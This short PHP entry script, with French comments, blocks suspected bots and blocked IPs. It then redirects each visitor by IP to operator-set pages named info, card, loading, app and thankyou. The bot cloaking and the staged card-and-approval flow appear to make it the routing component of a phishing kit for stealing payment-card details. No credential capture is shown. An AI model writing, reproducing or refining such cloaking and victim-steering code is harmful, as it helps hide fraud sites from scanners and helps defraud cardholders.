<?php
require_once 'config.php';

$ip = getVisitorIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Vérifier automatiquement si c'est un bot AVANT tout traitement
require_once 'auto_bot_blocker.php';
if (isBotVisitor($userAgent, $ip)) {
    // Bloquer le bot immédiatement
    autoBlockBot($ip, $userAgent, 'Bot detected at entry point');
    
    // Réponse minimale pour les bots
    http_response_code(403);
    header('Content-Type: text/plain');
    echo "Access Denied";
    exit;
}

// Vérifier si l'IP est bloquée
if (isIPBlocked($ip)) {
    http_response_code(403);
    echo "<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>Access Denied</h1><p>Your access has been restricted.</p></body></html>";
    exit;
}

// Vérifier s'il y a une redirection définie pour cette IP
$redirect = getRedirectForIP($ip);

if ($redirect) {
    // Rediriger vers la page spécifiée
    switch ($redirect) {
        case 'index':
            // Rester sur index.php, ne pas rediriger
            break;
        case 'page1':
        case 'info':
            header('Location: info.php');
            exit;
        case 'page2':
        case 'card':
            header('Location: card.php');
            exit;
        case 'page3':
        case 'loading':
        case 'waiting':
            header('Location: loading.php');
            exit;
        case 'page4':
        case 'app':
            header('Location: app.php');
            exit;
        case 'page5':
        case 'thankyou':
            header('Location: thankyou.php');
            exit;
    }
}

// Par défaut, rediriger vers info
header('Location: info.php');
exit;
?>
